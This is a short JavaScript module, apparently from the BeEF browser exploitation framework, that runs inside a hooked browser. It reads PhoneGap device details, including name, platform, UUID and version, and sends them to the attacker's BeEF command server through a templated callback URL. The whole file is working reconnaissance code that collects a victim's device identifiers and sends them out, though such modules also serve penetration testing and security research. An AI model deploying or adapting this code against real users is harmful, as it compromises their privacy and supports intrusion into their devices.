// 
// detect phonegap
//
beef.execute(function() {

    var phonegap_details;

    try {
        phonegap_details = ""
        + " name: " + device.name 
        + " phonegap api: " + device.phonegap
        + " platform: " + device.platform
        + " uuid: " + device.uuid
        + " version: " + device.version;
    } catch(e) {
        phonegap_details = "unable to detect phonegap";
    }

    beef.net.send("<%= @command_url %>", <%= @command_id %>, "phonegap="+phonegap_details);

});
